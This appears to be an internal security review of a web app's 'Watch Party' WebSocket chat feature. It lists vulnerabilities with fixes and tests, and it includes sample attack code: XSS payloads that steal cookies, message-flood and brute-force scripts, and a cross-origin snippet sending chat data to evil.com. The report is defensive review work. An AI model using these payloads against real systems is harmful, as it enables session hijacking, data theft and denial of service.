# Watch Party Security Review Report

**Date:** 2026-01-23
**Reviewer:** Security Specialist
**Feature:** Watch Party (Real-time Viewing Rooms)
**Status:** ⚠️ **CHANGES REQUIRED**

---

## Executive Summary

The Watch Party feature implements real-time video synchronization and chat functionality using WebSocket connections. While the implementation shows several security best practices, **critical vulnerabilities and missing security controls** have been identified that require immediate remediation before production deployment.

**Critical Risk Level:** HIGH
**OWASP Compliance:** PARTIALLY NON-COMPLIANT

---

## Architecture Overview

### Components Reviewed

**Frontend:**
- `/web/src/components/watchparty/` - UI components (9 files)
- `/web/src/components/player/hooks/useWatchParty.ts` - Integration hook
- `/web/src/stores/watchPartyStore.js` - State management and WebSocket client

**Backend:**
- `/backend/app/api/routes/party.py` - REST API endpoints (14 endpoints)
- `/backend/app/api/routes/websocket.py` - WebSocket handler
- `/backend/app/services/room_manager.py` - Party lifecycle management
- `/backend/app/services/connection_manager.py` - WebSocket connection pooling
- `/backend/app/models/realtime.py` - Data models

**Data Flow:**
```
Frontend UI → WebSocket Client → Backend WebSocket Handler
                                          ↓
                                    Room Manager
                                          ↓
                                 Connection Manager
                                          ↓
                            Broadcast to Party Members
```

---

## Critical Security Vulnerabilities

### 🚨 CRITICAL: No Input Sanitization on Chat Messages

**Location:** `/backend/app/services/room_manager.py:206-308`

**Issue:**
```python
# Line 229: Chat message stored without sanitization
message = ChatMessage(
    party_id=party_id,
    user_id=user_id,
    user_name=user_name,
    message=data.message,  # ⚠️ NO SANITIZATION
    message_type=data.message_type,
    source_language=source_lang,
)
```

**Risk:** **CRITICAL**
- **XSS (Cross-Site Scripting):** Malicious users can inject JavaScript payloads in chat messages
- **HTML Injection:** Messages can contain unescaped HTML that renders in other users' browsers
- **Script Execution:** `<script>alert('XSS')</script>` would execute in recipient browsers

**Attack Vector:**
```javascript
// Attacker sends:
onSendMessage('<img src=x onerror="alert(document.cookie)">');

// Victim's browser receives and renders unescaped HTML
// Cookie theft, session hijacking possible
```

**OWASP Mapping:** A03:2021 – Injection (XSS)

**Required Fix:**
```python
import bleach
from html import escape

# In send_chat_message method:
sanitized_message = bleach.clean(
    data.message,
    tags=[],  # No HTML tags allowed
    strip=True
)

# OR escape all HTML entities
sanitized_message = escape(data.message)
```

---

### 🚨 CRITICAL: Missing Rate Limiting on WebSocket Messages

**Location:** `/backend/app/api/routes/websocket.py:118-185`

**Issue:**
```python
# Message loop has NO rate limiting
while True:
    data = await websocket.receive_text()
    # Process message immediately without throttling
```

**Risk:** **CRITICAL**
- **DoS (Denial of Service):** Attacker can flood server with messages
- **Resource Exhaustion:** Unlimited message processing consumes CPU/memory
- **Chat Spam:** Malicious users can spam chat with thousands of messages/second

**Attack Vector:**
```javascript
// Attacker script:
const ws = new WebSocket('ws://api/ws/party/123?token=...');
while(true) {
  ws.send(JSON.stringify({type: 'chat', message: 'SPAM'.repeat(100)}));
}
// Server processes all messages without limits → crash
```

**OWASP Mapping:** A05:2021 – Security Misconfiguration

**Required Fix:**
```python
from collections import defaultdict
from datetime import datetime, timedelta

class RateLimiter:
    def __init__(self, max_per_minute=30):
        self.limits = defaultdict(list)
        self.max_per_minute = max_per_minute

    def is_allowed(self, user_id: str) -> bool:
        now = datetime.utcnow()
        cutoff = now - timedelta(minutes=1)

        # Remove old timestamps
        self.limits[user_id] = [
            ts for ts in self.limits[user_id]
            if ts > cutoff
        ]

        if len(self.limits[user_id]) >= self.max_per_minute:
            return False

        self.limits[user_id].append(now)
        return True

# In websocket handler:
rate_limiter = RateLimiter(max_per_minute=30)

while True:
    data = await websocket.receive_text()

    if not rate_limiter.is_allowed(user_id):
        await connection_manager.send_personal_message(
            {"type": "error", "message": "Rate limit exceeded"},
            connection_id
        )
        continue
```

---

### 🔴 HIGH: Room Code Enumeration Attack

**Location:** `/backend/app/api/routes/party.py:39-57`

**Issue:**
```python
@router.get("/join/{room_code}", response_model=WatchPartyResponse)
async def join_by_code(
    room_code: str, current_user: User = Depends(get_current_active_user)
):
    """Join a party using room code"""
    party = await room_manager.get_party_by_code(room_code)
    if not party:
        raise HTTPException(status_code=404, detail="Party not found or ended")
    # ⚠️ Reveals if room exists before authorization check
```

**Risk:** **HIGH**
- **Information Disclosure:** Attacker can enumerate valid room codes
- **Brute Force Attack:** 6-character codes = 36^6 = ~2 billion combinations
- **Privacy Violation:** Can discover which rooms are active

**Attack Vector:**
```bash
# Brute force script
for code in AAAAAA..ZZZZZZ:
  response = requests.get(f"/api/v1/party/join/{code}")
  if response.status_code != 404:
    print(f"Valid room: {code}")
```

**OWASP Mapping:** A01:2021 – Broken Access Control

**Required Fix:**
```python
# Implement constant-time response + rate limiting
@router.get("/join/{room_code}", response_model=WatchPartyResponse)
@limiter.limit("10/minute")  # ← Add rate limiting
async def join_by_code(
    room_code: str,
    current_user: User = Depends(get_current_active_user)
):
    # Constant-time lookup (always takes same time)
    party = await room_manager.get_party_by_code(room_code)

    # Generic error message (no information leak)
    if not party or party.participant_count >= party.max_participants:
        raise HTTPException(
            status_code=403,  # ← Changed from 404
            detail="Unable to join room"  # ← Generic message
        )
```

---

### 🔴 HIGH: Missing Message Length Validation

**Location:** Multiple locations

**Issue:**
```python
# No max length validation on chat messages
class ChatMessageCreate(BaseModel):
    message: str  # ⚠️ No max_length constraint
    message_type: str = "text"
```

```typescript
// Frontend has limit but backend doesn't enforce
maxLength={500}  // Can be bypassed via API
```

**Risk:** **HIGH**
- **DoS via Large Payloads:** Attacker sends megabyte-sized messages
- **Memory Exhaustion:** Large messages consume excessive server memory
- **Database Bloat:** MongoDB stores unvalidated large documents

**Attack Vector:**
```python
requests.post('/api/v1/party/123/chat', json={
    'message': 'A' * 10_000_000,  # 10MB message
    'message_type': 'text'
})
```

**OWASP Mapping:** A04:2021 – Insecure Design

**Required Fix:**
```python
# Backend validation
class ChatMessageCreate(BaseModel):
    message: str = Field(
        ...,
        min_length=1,
        max_length=500,
        description="Chat message content"
    )
    message_type: str = Field(
        default="text",
        regex="^(text|emoji|system)$"  # Whitelist valid types
    )
```

---

### 🟡 MEDIUM: Weak Room Code Generation

**Location:** `/backend/app/services/room_manager.py:18-21`

**Issue:**
```python
def generate_room_code(length: int = 6) -> str:
    """Generate a random room code (uppercase letters and digits)"""
    chars = string.ascii_uppercase + string.digits  # 36 characters
    return "".join(secrets.choice(chars) for _ in range(length))
```

**Risk:** **MEDIUM**
- **Predictability:** 6-character codes = 36^6 ≈ 2.1 billion combinations
- **Brute Force Feasible:** With rate limiting bypass, can be enumerated
- **Collision Risk:** Birthday paradox applies with many active rooms

**Security Analysis:**
- Entropy: log2(36^6) ≈ 31 bits (below recommended 128 bits for secrets)
- With 10,000 active rooms: collision probability ≈ 0.002%

**OWASP Mapping:** A02:2021 – Cryptographic Failures

**Recommended Fix:**
```python
def generate_room_code(length: int = 8) -> str:  # ← Increased to 8
    """Generate a random room code"""
    # Use alphanumeric without confusing chars (0/O, 1/I/l)
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"  # 32 chars
    return "".join(secrets.choice(chars) for _ in range(length))
    # 8 characters = 32^8 ≈ 1.1 trillion combinations
```

---

### 🟡 MEDIUM: No WebSocket Message Origin Validation

**Location:** `/backend/app/api/routes/websocket.py:40-86`

**Issue:**
```python
@router.websocket("/ws/party/{party_id}")
async def party_websocket(websocket: WebSocket, party_id: str, token: str = Query(...)):
    # ⚠️ No Origin header validation
    # ⚠️ No CSRF token validation
    await websocket.accept()  # Accepts from any origin
```

**Risk:** **MEDIUM**
- **CSRF on WebSocket:** Malicious site can open WebSocket to your API
- **Cross-Origin Abuse:** Attacker site can interact with watch parties
- **Data Exfiltration:** Could leak party data to attacker domain

**Attack Vector:**
```html
<!-- Attacker's website -->
<script>
  // If user is logged in, this works:
  const ws = new WebSocket('wss://bayit.app/ws/party/123?token=stolen_token');
  ws.onmessage = (e) => {
    // Exfiltrate chat messages to attacker server
    fetch('https://evil.com/log', {method: 'POST', body: e.data});
  };
</script>
```

**OWASP Mapping:** A01:2021 – Broken Access Control

**Required Fix:**
```python
from fastapi import Header

@router.websocket("/ws/party/{party_id}")
async def party_websocket(
    websocket: WebSocket,
    party_id: str,
    token: str = Query(...),
    origin: Optional[str] = Header(None)
):
    # Validate Origin header
    allowed_origins = [
        "https://bayit.app",
        "https://www.bayit.app",
        "http://localhost:5173",  # Dev only
    ]

    if origin and origin not in allowed_origins:
        await websocket.close(code=1008, reason="Origin not allowed")
        return

    # Continue with authentication...
```

---

### 🟡 MEDIUM: Participant Count Bypass

**Location:** `/backend/app/api/routes/party.py:47-49`

**Issue:**
```python
if party.participant_count >= party.max_participants:
    raise HTTPException(status_code=400, detail="Party is full")

# ⚠️ Race condition between check and join
party = await room_manager.join_party(...)
```

**Risk:** **MEDIUM**
- **Race Condition:** Two users can join simultaneously when 9/10 slots filled
- **Over-Capacity Parties:** Can exceed max_participants limit
- **Resource Exhaustion:** More connections than expected

**Attack Vector:**
```python
# Launch 10 concurrent join requests when 9/10 slots filled
import asyncio
async def join_attack():
    tasks = [join_party_request() for _ in range(10)]
    await asyncio.gather(*tasks)
# Multiple users get in, exceeding limit
```

**OWASP Mapping:** A04:2021 – Insecure Design

**Required Fix:**
```python
# Use atomic operation in MongoDB
async def join_party(self, party_id: str, user_id: str, user_name: str):
    # Atomic update with condition
    result = await WatchParty.find_one_and_update(
        {
            "_id": ObjectId(party_id),
            "ended_at": None,
            "$expr": {
                "$lt": [{"$size": "$participants"}, "$max_participants"]
            },
            "participants.user_id": {"$ne": user_id}
        },
        {
            "$push": {
                "participants": {
                    "user_id": user_id,
                    "user_name": user_name,
                    "joined_at": datetime.utcnow()
                }
            }
        },
        return_document=ReturnDocument.AFTER
    )

    if not result:
        return None  # Party full or doesn't exist

    return result
```

---

## Input Validation Vulnerabilities

### 🔴 HIGH: No Emoji Validation

**Location:** `/backend/app/api/routes/party.py:179-194`

**Issue:**
```python
@router.post("/{party_id}/chat/{message_id}/react")
async def add_reaction(
    emoji: str = Query(..., min_length=1, max_length=10),  # ⚠️ Too permissive
    # ...
):
```

**Risk:** **HIGH**
- **Unicode Exploits:** Can send malicious Unicode characters
- **Visual Spoofing:** Right-to-left override characters (U+202E)
- **Storage Bloat:** Multi-byte Unicode sequences up to 10 chars = 40 bytes

**Attack Vector:**
```python
# Send malicious Unicode
requests.post('/api/v1/party/123/chat/456/react', params={
    'emoji': '\u202E' * 10  # Right-to-left override × 10
})
# Breaks UI rendering for all participants
```

**Required Fix:**
```python
import emoji as emoji_lib

def validate_emoji(value: str) -> str:
    # Check if valid emoji
    if not emoji_lib.is_emoji(value):
        raise ValueError("Invalid emoji")

    # Ensure single emoji (not multiple)
    emojis = emoji_lib.emoji_list(value)
    if len(emojis) != 1:
        raise ValueError("Only one emoji allowed")

    return value

@router.post("/{party_id}/chat/{message_id}/react")
async def add_reaction(
    emoji: str = Query(..., min_length=1, max_length=4),
    # ...
):
    try:
        emoji = validate_emoji(emoji)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
```

---

### 🟡 MEDIUM: Room Code Case Sensitivity

**Location:** `/backend/app/services/room_manager.py:63-67`

**Issue:**
```python
# Backend converts to uppercase
return await WatchParty.find_one(
    WatchParty.room_code == room_code.upper(),
    WatchParty.ended_at == None
)
```

```typescript
// Frontend also converts
const cleaned = value.toUpperCase().replace(/[^A-Z0-9]/g, '')
```

**Risk:** **MEDIUM**
- **Inconsistent Handling:** Multiple code paths doing same transformation
- **Potential Bypass:** If one path forgets .upper(), security issue
- **Database Inefficiency:** Case-insensitive queries are slower

**Required Fix:**
```python
# Enforce at database level with index
class WatchParty(Document):
    room_code: str = Field(...)

    @field_validator('room_code')
    @classmethod
    def normalize_room_code(cls, v: str) -> str:
        if not v:
            raise ValueError("Room code required")
        normalized = v.upper()
        if not re.match(r'^[A-Z0-9]{6,8}$', normalized):
            raise ValueError("Invalid room code format")
        return normalized

    class Settings:
        indexes = [
            IndexModel([("room_code", 1)], unique=True)  # Unique constraint
        ]
```

---

## Authentication & Authorization Issues

### 🔴 HIGH: JWT Token in Query Parameter

**Location:** `/backend/app/api/routes/websocket.py:41`

**Issue:**
```python
@router.websocket("/ws/party/{party_id}")
async def party_websocket(websocket: WebSocket, party_id: str, token: str = Query(...)):
    # ⚠️ Token in URL query parameter
```

**Risk:** **HIGH**
- **Token Leakage in Logs:** Query params logged by proxies, load balancers, servers
- **Browser History:** WebSocket URL with token stored in browser history
- **Referer Header:** Token leaked if user navigates away
- **OWASP Violation:** Sensitive data in URL

**Attack Vector:**
```
# Token appears in logs:
2026-01-23 10:30:15 [INFO] WebSocket connection: /ws/party/123?token=eyJhbG...
# ↑ JWT now in log files, accessible to anyone with log access
```

**OWASP Mapping:** A04:2021 – Insecure Design

**Recommended Fix:**
```python
# Option 1: Use WebSocket subprotocol for auth
@router.websocket("/ws/party/{party_id}")
async def party_websocket(
    websocket: WebSocket,
    party_id: str,
    sec_websocket_protocol: Optional[str] = Header(None)
):
    # Extract token from subprotocol header
    token = sec_websocket_protocol.replace('Bearer.', '') if sec_websocket_protocol else None

    if not token:
        await websocket.close(code=4001, reason="Token required")
        return

# Frontend:
const ws = new WebSocket('wss://api/ws/party/123', ['Bearer.' + token]);
```

```python
# Option 2: Use initial handshake message
@router.websocket("/ws/party/{party_id}")
async def party_websocket(websocket: WebSocket, party_id: str):
    await websocket.accept()

    # First message must be authentication
    try:
        auth_data = await asyncio.wait_for(
            websocket.receive_json(),
            timeout=5.0
        )
    except asyncio.TimeoutError:
        await websocket.close(code=4008, reason="Auth timeout")
        return

    if auth_data.get('type') != 'auth':
        await websocket.close(code=4001, reason="Auth required")
        return

    token = auth_data.get('token')
    user = await get_user_from_token(token)
    # ...continue
```

---

### 🟡 MEDIUM: No JWT Expiration Validation

**Location:** `/backend/app/api/routes/websocket.py:21-37`

**Issue:**
```python
async def get_user_from_token(token: str) -> Optional[User]:
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        user_id: str = payload.get("sub")
        # ⚠️ No explicit expiration check
```

**Risk:** **MEDIUM**
- **Long-Lived Tokens:** If exp not enforced, tokens work forever
- **Session Hijacking:** Stolen tokens usable indefinitely
- **Logout Not Enforced:** User logs out but WebSocket stays connected

**Required Fix:**
```python
from datetime import datetime

async def get_user_from_token(token: str) -> Optional[User]:
    try:
        payload = jwt.decode(
            token,
            settings.SECRET_KEY,
            algorithms=[settings.ALGORITHM],
            options={"verify_exp": True}  # ← Enforce expiration
        )

        user_id: str = payload.get("sub")
        if user_id is None:
            return None

        # Verify token not in revocation list
        if await is_token_revoked(token):
            return None

        user = await User.get(user_id)
        if user is None or not user.is_active:
            return None

        return user
    except jwt.ExpiredSignatureError:
        return None
    except JWTError:
        return None
```

---

### 🟡 MEDIUM: Host Transfer Without Confirmation

**Location:** `/backend/app/services/room_manager.py:123-135`

**Issue:**
```python
# If host leaves and there are other participants, transfer host
if party.host_id == user_id and party.participants:
    new_host = party.participants[0]  # ⚠️ No consent from new host
    party.host_id = new_host.user_id
    party.host_name = new_host.user_name
```

**Risk:** **MEDIUM**
- **Unwanted Host Role:** User becomes host without consent
- **Responsibility Without Authorization:** New host can end party for everyone
- **Social Engineering:** Attacker leaves/rejoins to manipulate host status

**Recommended Fix:**
```python
# Option 1: Ask for volunteer
if party.host_id == user_id and party.participants:
    # Notify participants host is leaving
    await connection_manager.broadcast_to_party(
        {
            "type": "host_leaving",
            "message": "Host is leaving. Would anyone like to become the new host?",
            "candidates": [p.user_id for p in party.participants]
        },
        party_id
    )

    # Wait 10 seconds for volunteer
    # If no volunteer, assign to longest-joined participant

# Option 2: End party when host leaves
if party.host_id == user_id:
    party.ended_at = datetime.utcnow()
    await connection_manager.broadcast_to_party(
        {"type": "party_ended", "reason": "host_left"},
        party_id
    )
```

---

## Data Exposure Risks

### 🟡 MEDIUM: Verbose Error Messages

**Location:** `/backend/app/api/routes/websocket.py:181-184`

**Issue:**
```python
except Exception as e:
    await connection_manager.send_personal_message(
        {"type": "error", "message": str(e)},  # ⚠️ Exposes internal errors
        connection_id
    )
```

**Risk:** **MEDIUM**
- **Information Disclosure:** Stack traces reveal internal paths, versions
- **Attack Surface Mapping:** Attacker learns about system architecture
- **Sensitive Data Leak:** Database errors may expose schema details

**Attack Vector:**
```python
# Trigger internal error
ws.send(JSON.stringify({
    type: 'chat',
    message: {'$ne': null}  # MongoDB injection attempt
}));
# Error message reveals: "ValidationError: field 'message' expected str, got dict"
```

**OWASP Mapping:** A05:2021 – Security Misconfiguration

**Required Fix:**
```python
import logging
logger = logging.getLogger(__name__)

except Exception as e:
    # Log full error for debugging
    logger.error(
        "WebSocket error",
        extra={
            "user_id": user_id,
            "party_id": party_id,
            "error": str(e),
            "traceback": traceback.format_exc()
        }
    )

    # Send generic error to client
    await connection_manager.send_personal_message(
        {
            "type": "error",
            "message": "An error occurred processing your request",
            "code": "INTERNAL_ERROR"
        },
        connection_id
    )
```

---

### 🟡 MEDIUM: User Enumeration via Participant List

**Location:** `/backend/app/services/connection_manager.py:216-233`

**Issue:**
```python
def get_party_users(self, party_id: str) -> List[dict]:
    """Get list of users in a party"""
    # ⚠️ Returns all user info without privacy controls
    users.append({
        "user_id": conn.user_id,
        "user_name": conn.user_name,
        "connected_at": conn.connected_at.isoformat(),
    })
```

**Risk:** **MEDIUM**
- **Privacy Violation:** Exposes user IDs and names to all participants
- **Targeted Attacks:** Attacker can learn which users are online
- **Social Engineering:** Real names used for phishing attacks

**Recommended Fix:**
```python
# Add privacy settings to User model
class User(Document):
    display_name_privacy: str = "public"  # public, friends, private

def get_party_users(self, party_id: str, requesting_user_id: str) -> List[dict]:
    """Get list of users in a party with privacy controls"""
    users = []
    for conn_id in self._party_connections[party_id]:
        if conn_id in self._connections:
            conn = self._connections[conn_id]
            user = await User.get(conn.user_id)

            # Check privacy settings
            if user.display_name_privacy == "private" and conn.user_id != requesting_user_id:
                display_name = "Anonymous User"
            else:
                display_name = conn.user_name

            users.append({
                "user_id": conn.user_id if user.display_name_privacy != "private" else f"anon_{hash(conn.user_id)}",
                "user_name": display_name,
                "connected_at": conn.connected_at.isoformat(),
            })

    return users
```

---

## OWASP Top 10 Compliance Matrix

| OWASP Category | Status | Findings | Priority |
|----------------|--------|----------|----------|
| **A01: Broken Access Control** | ❌ FAIL | Room code enumeration, WebSocket origin validation, participant count bypass | HIGH |
| **A02: Cryptographic Failures** | ⚠️ PARTIAL | Weak room code generation, JWT in URL | MEDIUM |
| **A03: Injection** | ❌ FAIL | XSS via unsanitized chat messages, emoji validation | CRITICAL |
| **A04: Insecure Design** | ⚠️ PARTIAL | Message length validation, race conditions, JWT in query params | HIGH |
| **A05: Security Misconfiguration** | ❌ FAIL | No rate limiting, verbose errors, missing origin validation | HIGH |
| **A06: Vulnerable Components** | ✅ PASS | Dependencies appear up-to-date | - |
| **A07: Auth Failures** | ⚠️ PARTIAL | JWT expiration, token in URL | MEDIUM |
| **A08: Data Integrity** | ✅ PASS | Proper state management | - |
| **A09: Logging Failures** | ⚠️ PARTIAL | Token logged in URLs, no audit trail for sensitive actions | LOW |
| **A10: SSRF** | ✅ PASS | No server-side requests based on user input | - |

**Overall OWASP Compliance: 40% (4/10 passed)**

---

## Security Best Practices - What's Working

### ✅ Positive Security Controls

1. **Authentication Required:**
   - All endpoints require `get_current_active_user` dependency
   - WebSocket connections validate JWT tokens
   - User must be authenticated to create/join parties

2. **Authorization Checks:**
   - Host-only actions enforced (end party, sync playback)
   - Participant membership verified before allowing actions
   - User must be in party to send messages

3. **Cryptographically Secure Random:**
   - Uses `secrets` module for room code generation (not `random`)
   - Provides cryptographic randomness

4. **Connection Cleanup:**
   - Proper WebSocket disconnect handling
   - Participants removed from party on disconnect
   - Memory leaks prevented via connection manager

5. **Database Indexing:**
   - Proper indexes on `room_code`, `host_id`, `content_id`
   - Efficient queries for party lookup

6. **State Management:**
   - Consistent state updates
   - Party lifecycle properly managed
   - Atomic operations where possible

---

## Remediation Roadmap

### Phase 1: Critical Fixes (Immediate - Before ANY Production Use)

**Timeline: 1-2 days**

1. **✅ MUST FIX: Sanitize Chat Messages**
   - Implement HTML escaping or use bleach library
   - Add XSS protection on both frontend and backend
   - Test with OWASP XSS payload list

2. **✅ MUST FIX: Implement Rate Limiting**
   - Add WebSocket message rate limiter (30 msgs/minute)
   - Add REST API rate limiter (10 req/minute on /join)
   - Use Redis for distributed rate limiting

3. **✅ MUST FIX: Message Length Validation**
   - Backend: Add Pydantic Field max_length=500
   - Validate on both REST and WebSocket paths
   - Return 400 error for oversized messages

4. **✅ MUST FIX: Fix JWT in URL**
   - Move token to WebSocket subprotocol header
   - Update frontend WebSocket connection code
   - Test with browser DevTools

### Phase 2: High Priority Fixes (Before Beta Launch)

**Timeline: 3-5 days**

5. **Prevent Room Code Enumeration**
   - Change 404 to 403 with generic error
   - Implement constant-time checks
   - Add rate limiting to /join endpoint

6. **Add WebSocket Origin Validation**
   - Whitelist allowed origins
   - Validate Origin header on WebSocket handshake
   - Test with cross-origin requests

7. **Validate Emoji Reactions**
   - Use emoji library to validate
   - Limit to single emoji
   - Sanitize Unicode

8. **Fix Participant Count Race Condition**
   - Use MongoDB atomic findOneAndUpdate
   - Add optimistic locking
   - Test with concurrent join requests

### Phase 3: Medium Priority Improvements (Before GA)

**Timeline: 1 week**

9. **Strengthen Room Codes**
   - Increase to 8 characters
   - Remove confusing characters (0/O, 1/I)
   - Document entropy calculation

10. **Improve Error Handling**
    - Generic client-facing errors
    - Detailed server-side logging
    - Error codes instead of messages

11. **Add Privacy Controls**
    - User display name privacy settings
    - Anonymous mode option
    - Profile visibility controls

12. **JWT Improvements**
    - Enforce expiration validation
    - Token revocation list
    - Refresh token mechanism

### Phase 4: Enhancements (Post-GA)

**Timeline: Ongoing**

13. **Audit Logging**
    - Log all sensitive actions (join, leave, end party)
    - Track room code attempts
    - Monitor for abuse patterns

14. **Content Moderation**
    - Auto-moderation for chat messages
    - Profanity filter
    - Spam detection

15. **Advanced Security**
    - End-to-end encryption for messages
    - IP-based rate limiting
    - CAPTCHA for repeated failed joins

---

## Testing Requirements

### Security Test Cases - MUST PASS

**XSS Testing:**
```javascript
// Test 1: HTML injection
sendMessage('<script>alert("XSS")</script>');
// Expected: Escaped text displayed, no alert

// Test 2: Event handlers
sendMessage('<img src=x onerror="alert(1)">');
// Expected: Escaped text, no execution

// Test 3: Unicode exploits
sendMessage('\u202E\u202D\u2066\u2067');
// Expected: Sanitized or rejected
```

**Rate Limiting Testing:**
```python
# Test 1: WebSocket message flood
for i in range(100):
    ws.send(json.dumps({'type': 'chat', 'message': f'msg{i}'}))
# Expected: After 30 messages, rate limit error

# Test 2: REST API brute force
for code in ['AAA111', 'BBB222', ...]:  # 20 codes
    requests.get(f'/api/v1/party/join/{code}')
# Expected: After 10 requests, 429 Too Many Requests
```

**Access Control Testing:**
```python
# Test 1: Non-participant tries to send message
user_not_in_party.send_message(party_id, "Hi")
# Expected: 403 Forbidden

# Test 2: Non-host tries to end party
participant.end_party(party_id)
# Expected: 403 Only host can end party

# Test 3: Join full party
for i in range(15):  # max_participants = 10
    create_user().join_party(party_id)
# Expected: After 10, returns "Party is full"
```

**Token Security Testing:**
```bash
# Test 1: Expired token
token="eyJ..." # Expired 1 hour ago
curl -H "Authorization: Bearer $token" /api/v1/party/create
# Expected: 401 Unauthorized

# Test 2: Token in logs
grep "token=" /var/log/nginx/access.log
# Expected: No JWT tokens found (moved to header)
```

---

## Monitoring & Alerting

### Security Metrics to Track

**Real-time Alerts:**
- Rate limit violations > 10/minute → Alert
- Failed JWT validation > 50/hour → Alert
- XSS payload detection in messages → Block + Alert
- Participant count exceeded → Investigate
- Room code enumeration attempts → IP ban

**Daily Metrics:**
- Total parties created
- Average party size
- Messages sent (total, per user)
- Failed join attempts by reason
- WebSocket disconnections (normal vs errors)

**Weekly Security Review:**
- Top error types
- Most common rate limit violations
- Unusual activity patterns
- User reports of abuse

---

## Compliance Checklist

### Pre-Deployment Security Sign-Off

- [ ] **CRITICAL: XSS sanitization implemented and tested**
- [ ] **CRITICAL: Rate limiting deployed on WebSocket and REST**
- [ ] **CRITICAL: Message length validation enforced**
- [ ] **HIGH: JWT moved out of query parameters**
- [ ] **HIGH: Room code enumeration mitigated**
- [ ] **HIGH: WebSocket origin validation added**
- [ ] **MEDIUM: Emoji validation implemented**
- [ ] **MEDIUM: Race condition fixes deployed**
- [ ] Security test suite passing 100%
- [ ] Penetration testing completed
- [ ] OWASP ZAP scan passed
- [ ] Security documentation reviewed
- [ ] Incident response plan documented
- [ ] Monitoring and alerts configured

---

## Final Recommendation

### ⚠️ **STATUS: CHANGES REQUIRED - DO NOT DEPLOY TO PRODUCTION**

**The Watch Party feature contains multiple critical security vulnerabilities that MUST be remediated before any production deployment.**

**Severity Breakdown:**
- **CRITICAL:** 2 vulnerabilities (XSS, no rate limiting)
- **HIGH:** 4 vulnerabilities (room enumeration, JWT in URL, message length, origin validation)
- **MEDIUM:** 6 vulnerabilities (weak codes, race conditions, errors, etc.)

**Required Actions:**
1. ✅ Fix all CRITICAL and HIGH severity issues (Phase 1 & 2)
2. ✅ Pass all security test cases
3. ✅ Complete penetration testing
4. ✅ Get security team sign-off
5. ✅ Deploy to staging for additional testing

**Estimated Remediation Time:** 5-7 days with dedicated security focus

**Risk if Deployed As-Is:**
- High likelihood of XSS attacks compromising user sessions
- DoS attacks via message flooding
- Room code brute-forcing exposing private parties
- JWT token leakage in logs/browser history
- OWASP compliance failure (40% vs 90%+ required)

### Post-Remediation

Once all critical and high-priority issues are resolved:
- ✅ Feature can proceed to production
- Regular security audits recommended (quarterly)
- Bug bounty program for ongoing vulnerability discovery
- Continuous monitoring for abuse patterns

---

## References

**OWASP Resources:**
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP WebSocket Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)

**Security Best Practices:**
- JWT Best Current Practices (RFC 8725)
- WebSocket Security Considerations (RFC 6455 Section 10)
- Rate Limiting Strategies (IETF Draft)

---

**Review Date:** 2026-01-23
**Next Review:** After remediation (before production deployment)
**Reviewer:** Security Specialist
**Classification:** Internal - Security Review

---

## Appendix: Code Review Checklist Used

- [x] Input validation on all user inputs
- [x] Output encoding/sanitization
- [x] Authentication on all endpoints
- [x] Authorization checks for privileged actions
- [x] Rate limiting on API endpoints
- [x] Rate limiting on WebSocket messages
- [x] Token handling (storage, transmission)
- [x] Error message information disclosure
- [x] Race condition analysis
- [x] Database query injection prevention
- [x] XSS prevention
- [x] CSRF protection
- [x] Origin validation for WebSockets
- [x] Session management
- [x] Cryptographic randomness
- [x] Privacy controls
- [x] Logging and monitoring
- [x] OWASP Top 10 compliance
